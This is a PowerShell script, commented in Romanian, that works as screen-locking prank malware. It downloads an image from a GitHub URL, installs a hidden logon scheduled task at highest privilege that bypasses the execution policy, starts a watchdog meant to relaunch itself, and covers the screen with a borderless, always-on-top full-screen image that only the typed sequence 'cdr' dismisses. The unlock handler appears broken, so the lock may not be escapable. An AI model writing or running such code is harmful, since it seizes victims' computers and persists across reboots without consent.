# Configurare URL pentru imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\cdr.png"

# Funcție de monitorizare multiplă
function Monitor-Process {
    while ($true) {
        # Dacă procesul curent nu există, repornește scriptul
        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$MyInvocation.MyCommand.Path'" -WindowStyle Hidden
            exit
        }
        Start-Sleep -Seconds 1
    }
}

# Setează sarcina să ruleze automat la startup
function Set-Startup {
    $taskName = "PersistentImageViewer"
    $scriptPath = $MyInvocation.MyCommand.Path
    schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
}

# Descărcare imagine de pe URL
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii." -ForegroundColor Red
        exit
    }
}

# Afișare imagine pe ecran complet
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.KeyPreview = $true

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    $global:keySequence = ""
    $form.Add_KeyDown({
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-AllInstances
        }
    })

    $form.ShowDialog()
}

# Funcție pentru oprirea completă a tuturor instanțelor scriptului
function Stop-AllInstances {
    Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_ -and $_.MainWindowTitle -eq "PowerShell") {
            Stop-Process -Id $_.Id -Force
        }
    }
    schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
    exit
}

# Descărcare și pregătire
Download-Image

# Setare persistență
Set-Startup

# Pornire monitorizare multiplă
Start-Job -ScriptBlock { Monitor-Process }

# Afișează imaginea pe tot ecranul
Show-FullScreenImage
